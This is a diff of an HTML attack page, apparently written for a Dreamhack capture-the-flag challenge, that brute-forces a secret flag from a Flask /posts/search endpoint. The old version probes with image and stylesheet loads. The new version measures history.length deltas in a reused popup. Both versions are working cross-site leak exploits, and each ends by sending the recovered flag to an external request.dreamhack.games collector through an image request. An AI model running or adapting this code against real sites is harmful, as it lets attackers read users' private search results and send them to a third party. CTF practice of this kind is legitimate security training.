@@ -1,59 +1,113 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>XS-Search Exfil (HEX 10)</title>
+<title>Visited-Link XS-Leak for Flask /posts/search</title>
 <script>
-(async () => {
-  const HEX = "0123456789ABCDEF";
-  let body = "";                 
-  const base = "DH{";
+/**
+ * === CONFIG ===
+ * 공격 페이지는 어디든 상관없음(교차사이트 OK). 
+ * victim은 admin-bot이 로그인된 http://localhost:3000 이라고 가정.
+ */
+const VICTIM_ORIGIN  = "http://localhost:3000";
+const BUILD_VICTIM   = (guess) => `${VICTIM_ORIGIN}/posts/search?query=${encodeURIComponent(guess)}&_=${Math.random()}`;
+const HEX            = "0123456789ABCDEF";
+const FLAG_PREFIX    = "DH{";
+const FLAG_BODY_LEN  = 10; // [0-9A-F]{10}
+const NAV_WAIT_MS    = 160; // 내비게이션 대기(환경 따라 120~250 조정)
+const WATCHDOG_MS    = 5000; // 각 시도 타임아웃
+const COLLECTOR_URL  = "https://mzwmhrk.request.dreamhack.games/leak"; 
 
-  function probeIMG(q) {
-    return new Promise((resolve) => {
-      const img = new Image();
-      img.onload = () => resolve(true);     // 보통 200
-      img.onerror = () => resolve(false);   // 보통 404
-      img.src = "http://localhost:3000/posts/search?query=" +
-                encodeURIComponent(q) + "&_=" + Math.random();
-    });
-  }
+/**
+ * 자식 창 모드: #child-start / #child-check 에서 history.length 보고만함.
+ */
+if (location.hash.startsWith("#child-start")) {
+  // baseline 보고
+  window.opener && window.opener.postMessage({type:"baseline", len: history.length}, "*");
+} else if (location.hash.startsWith("#child-check")) {
+  // 내비→복귀 후 길이 보고
+  window.opener && window.opener.postMessage({type:"check", len: history.length}, "*");
+} else {
+  // 부모(컨트롤러) 모드
+  (async () => {
+    const log = (...a) => { console.log(...a); document.body.insertAdjacentHTML("beforeend", `<div>${a.map(String).join(" ")}</div>`); };
+    const ATTACK_URL = location.href.split("#")[0];
 
-  function probeCSS(q) {
-    return new Promise((resolve) => {
-      const link = document.createElement("link");
-      link.rel = "stylesheet";
-      link.href = "http://localhost:3000/posts/search?query=" +
-                  encodeURIComponent(q) + "&_=" + Math.random();
-      link.onload  = () => { link.remove(); resolve(true);  };
-      link.onerror = () => { link.remove(); resolve(false); };
-      document.head.appendChild(link);
-    });
-  }
+    // 팝업 1개를 재사용하며, 각 시도마다 baseline→victim→복귀 순서로 길이 델타 측정
+    let w = window.open(`${ATTACK_URL}#child-start`, "xsleak_popup", "popup,width=800,height=600");
 
-  const probe = probeCSS;
+    function onceMessage(expectedType, fromWin, timeoutMs = WATCHDOG_MS) {
+      return new Promise((resolve, reject) => {
+        const to = setTimeout(() => { window.removeEventListener("message", onMsg); reject(new Error("timeout: " + expectedType)); }, timeoutMs);
+        function onMsg(ev) {
+          if (ev.source !== fromWin) return;
+          const d = ev.data || {};
+          if (d.type === expectedType && typeof d.len === "number") {
+            clearTimeout(to);
+            window.removeEventListener("message", onMsg);
+            resolve(d.len);
+          }
+        }
+        window.addEventListener("message", onMsg);
+      });
+    }
 
-  while (body.length < 10) {
-    let hit = false;
-    for (const c of HEX) {
-      const guess = base + body + c;
-      const ok = await probe(guess);
-      if (ok) {                    
-        body += c;
-        console.log("[*] hit:", base + body);
-        hit = true;
-        break;
+    async function ensureBaseline(win) {
+      // 같은 창을 재사용: child-start 로 되돌려 baseline 수집
+      win.location.href = `${ATTACK_URL}#child-start&_=${Math.random()}`;
+      const baseLen = await onceMessage("baseline", win);
+      return baseLen;
+    }
+
+    async function probe200(win, victimURL) {
+      // baseline 확보
+      const before = await ensureBaseline(win);
+
+      // 피해자 URL로 "최상위 네비게이션"(Lax 쿠키 전송됨)
+      win.location.href = victimURL;
+
+      // 충분히 기다렸다가(콘텐츠 로드 신뢰 불가 → 시간 대기) 우리 페이지로 복귀
+      await new Promise(r => setTimeout(r, NAV_WAIT_MS));
+      // cross-origin 이지만 location 쓰기는 허용됨
+      win.location.href = `${ATTACK_URL}#child-check&_=${Math.random()}`;
+
+      const after = await onceMessage("check", win);
+      const delta = after - before;
+      // 기대값: 200 → +2 (victim 기록 + 복귀), 404 → +1 (victim 미기록 + 복귀만)
+      const is200 = (delta >= 2);
+      return {before, after, delta, is200};
+    }
+
+    // ====== 브루트포스 본체 ======
+    let body = "";
+    outer:
+    while (body.length < FLAG_BODY_LEN) {
+      let hit = false;
+      // 같은 팝업 재사용으로 속도↑
+      for (const c of HEX) {
+        const guess = FLAG_PREFIX + body + c;
+        const url   = BUILD_VICTIM(guess);
+        const r     = await probe200(w, url);
+        log(`[pos ${body.length}] try ${guess} → delta=${r.delta} → ${r.is200 ? "200" : "404"}`);
+        if (r.is200) {
+          body += c;
+          hit = true;
+          break;
+        }
+      }
+      if (!hit) {
+        log("[-] no candidate matched at pos", body.length, " — 중단");
+        break outer;
       }
     }
-    if (!hit) {               
-      console.log("[-] no candidate matched at pos", body.length);
-      break;
-    }
-  }
 
-  const flag = base + body + "}";
-  console.log("[+] FLAG?", flag);
-  
-  new Image().src = "https://rylwggi.request.dreamhack.games/leak?f=" + encodeURIComponent(flag);
+    const flag = FLAG_PREFIX + body + "}";
+    log("[+] FLAG ?", flag);
 
-  document.body.innerHTML = `<h1>Done</h1><p>${flag}</p>`;
-})();
+    // 수집기로 유출(선택)
+    new Image().src = `${COLLECTOR_URL}?f=${encodeURIComponent(flag)}&_=${Math.random()}`;
+
+    try { w.close(); } catch(e) {}
+  })();
+}
 </script>
+<h1>Visited-Link XS-Leak for /posts/search</h1>
+<p>콘솔 로그를 보세요. (각 시도별 delta=2 → 200 / delta=1 → 404)</p>
